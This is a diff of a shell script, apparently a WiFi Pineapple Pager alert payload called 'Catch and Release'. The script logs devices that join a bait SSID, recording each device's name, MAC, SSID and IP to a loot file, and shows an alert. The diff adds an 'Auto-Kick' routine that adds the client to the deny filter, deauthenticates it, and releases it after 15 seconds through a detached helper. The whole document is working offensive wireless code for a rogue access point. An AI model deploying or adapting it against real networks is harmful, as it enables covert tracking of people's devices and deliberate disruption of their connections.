@@ -6,7 +6,7 @@
 ##              plus MAC and the bait SSID it connected to; appends a line to
 ##              loot. Shows a simple on-screen ALERT.
 ## Author: Skinny Research & Development
-## Version: 2.8
+## Version: 2.12
 ##
 ## Trigger: this is an ALERT payload. The Pager's pineapd launches it when a
 ##          client associates to the PineAP/OpenAP (pineapple_client_connected
@@ -25,9 +25,19 @@
 ##   SSID:     <bait ssid>
 ##   man:      <manufacturer>
 ##
+## Optional kick ("catch and release"): the sibling "Auto-Kick" payload in this
+## alert category is the toggle. Enable it in the Pager's Alerts UI (it appears
+## next to CatchAndRelease) and, right after the alert, this payload blocks the
+## client in the PineAP deny filter and deauths it via PINEAPPLE_DEAUTH_CLIENT.
+## The block is TEMPORARY (~15s): a detached helper re-allows the MAC afterwards
+## so the device can reconnect. Blocking first prevents the phone from instantly
+## rejoining the still-broadcast bait (which otherwise causes a connect/deauth
+## flap / spinner). Disable Auto-Kick and devices stay connected. Default: off.
+##
 ## Loot:
 ##   /root/loot/catch-and-release/YYYYMMDD-catch-and-release.log
-##     TS | NAME | MAC | SSID | IP
+##     TS | NAME   | MAC | SSID | IP
+##     TS | KICKED | MAC | SSID | IP     (only when the kick toggle is on)
 ##
 ## Name resolution order:
 ##   1. mDNS (umdns) by client IP/MAC - the real advertised device name.
@@ -55,6 +65,17 @@ MAC="${_ALERT_CLIENT_CONNECTED_CLIENT_MAC_ADDRESS:-unknown}"
 SSID="${_ALERT_CLIENT_CONNECTED_SSID:-<none>}"
 
 LOOTDIR="/root/loot/catch-and-release"
+
+# Kick gate: the sibling "Auto-Kick" payload in this alert category is the
+# toggle. When it is ENABLED in the Pager's Alerts UI its dir is present
+# (.../pineapple_client_connected/Auto-Kick); disabling it renames the dir to
+# DISABLED.Auto-Kick. When enabled, the client is deauthed right after the
+# alert ("catch and release").
+CATDIR="/root/payloads/alerts/pineapple_client_connected"
+
+# How long (seconds) a released client stays blocked in the deny filter before
+# it is allowed to reconnect.
+BLOCK_SECS=15
 
 # Strip pipe/tab/CR/LF so the single log line cannot be broken by odd input.
 san() { printf '%s' "$1" | tr -d '|\t\r\n'; }
@@ -105,6 +126,35 @@ port_open() {
     [ -n "$p" ] || return 1
     command -v nc >/dev/null 2>&1 || return 1
     timeout 4 nc -w 2 "$ip" "$p" </dev/null >/dev/null 2>&1
+}
+
+# kick_client <mac>: release the client off the OpenAP. Blocks it in the PineAP
+# deny filter and deauths it, then a detached helper re-allows it after
+# BLOCK_SECS so it can reconnect (the bait is still being broadcast, so a bare
+# deauth would just flap). Returns non-zero if it could not be issued.
+kick_client() {
+    local mac="$1" bssid ch prev
+    [ -n "$mac" ] && [ "$mac" != "unknown" ] || return 1
+    command -v PINEAPPLE_DEAUTH_CLIENT >/dev/null 2>&1 || return 1
+    bssid="$(iw dev wlan0open info 2>/dev/null | awk '/addr/{print $2; exit}')"
+    [ -n "$bssid" ] || bssid="$(hostapd_cli -i wlan0open status 2>/dev/null | awk -F= '/^bssid\[0\]/{print $2}')"
+    ch="$(iw dev wlan0open info 2>/dev/null | sed -n 's/.*channel \([0-9][0-9]*\).*/\1/p')"
+    [ -n "$bssid" ] && [ -n "$ch" ] || return 1
+
+    # Snapshot any existing deny entries so the temporary block does not wipe
+    # them when it clears itself (PINEAPPLE_DEVICE_FILTER_DELETE is broken).
+    prev="$(PINEAPPLE_DEVICE_FILTER_LIST deny 2>/dev/null \
+        | grep -oiE '([0-9a-f]{2}:){5}[0-9a-f]{2}' \
+        | grep -viE "^${mac}$" | tr '\n' ' ')"
+
+    command -v PINEAPPLE_DEVICE_FILTER_ADD >/dev/null 2>&1 && \
+        PINEAPPLE_DEVICE_FILTER_ADD deny "$mac" >/dev/null 2>&1
+    PINEAPPLE_DEAUTH_CLIENT "$bssid" "$mac" "$ch" >/dev/null 2>&1
+
+    # Un-block after BLOCK_SECS so the device can reconnect. Detached so it
+    # survives this payload exiting (new session via setsid).
+    setsid sh -c "sleep ${BLOCK_SECS:-15}; PINEAPPLE_DEVICE_FILTER_CLEAR deny >/dev/null 2>&1; for m in $prev; do PINEAPPLE_DEVICE_FILTER_ADD deny \$m >/dev/null 2>&1; done" \
+        >/dev/null 2>&1 </dev/null &
 }
 
 # mdns_try <ip> <mac-lowercase>: one umdns browse + resolve pass. The embedded
@@ -245,11 +295,22 @@ NAME="$(san "$NAME")"
 if is_random_mac "$MAC"; then MACLABEL="MAC(R)"; else MACLABEL="MAC"; fi
 
 mkdir -p "$LOOTDIR" 2>/dev/null
+LOG="$(date +"$LOOTDIR/%Y%m%d-catch-and-release.log")"
 printf '%s | %s | %s | %s | %s\n' \
     "$(date '+%Y-%m-%d %H:%M:%S')" "$NAME" "$MAC" "$SSID" "$IP" \
-    >> "$(date +"$LOOTDIR/%Y%m%d-catch-and-release.log")" 2>/dev/null
+    >> "$LOG" 2>/dev/null
 
 # Simple on-screen alert: name, MAC (flagged if randomized), bait SSID, vendor.
 ALERT "New device\n\n Dev Name: $NAME\n $MACLABEL: $MAC\n SSID: $SSID\n man: $MAN"
+
+# Optional "release": if the Auto-Kick toggle is enabled, deauth the client now
+# that the catch has been logged and the alert has fired.
+if [ -d "$CATDIR/Auto-Kick" ]; then
+    if kick_client "$MAC"; then
+        printf '%s | %s | %s | %s | %s\n' \
+            "$(date '+%Y-%m-%d %H:%M:%S')" "KICKED" "$MAC" "$SSID" "$IP" \
+            >> "$LOG" 2>/dev/null
+    fi
+fi
 
 exit 0
